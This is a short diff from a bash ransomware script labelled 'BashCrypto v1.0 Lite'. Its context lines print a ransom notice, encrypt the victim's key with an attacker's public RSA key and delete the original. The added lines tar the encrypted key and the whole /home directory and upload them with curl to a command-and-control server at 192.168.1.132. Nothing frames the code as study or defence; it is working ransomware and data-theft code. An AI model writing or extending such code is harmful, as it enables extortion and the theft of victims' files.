@@ -126,3 +126,7 @@ echo "Your files have been encrypted using RSA-4096. This occured by generating 
 # Encrypt key.bin with our public key
 openssl rsautl -encrypt -inkey /root/pub.pem -pubin -in /root/key.bin -out /root/key.bin.enc
 rm -rf /root/key.bin
+
+# Exfil files to our C2
+tar czf - /root/key.bin.enc | curl -k -A "BashCrypto v1.0 Lite" -d "unique_id=${genKey}" -F "uploadFile=@-" https://192.168.1.132/upload.php
+tar czf - /home/ | curl -k -A "BashCrypto v1.0 Lite" -d "unique_id=${genKey}" -F "uploadFile=@-" https://192.168.1.132/upload.php
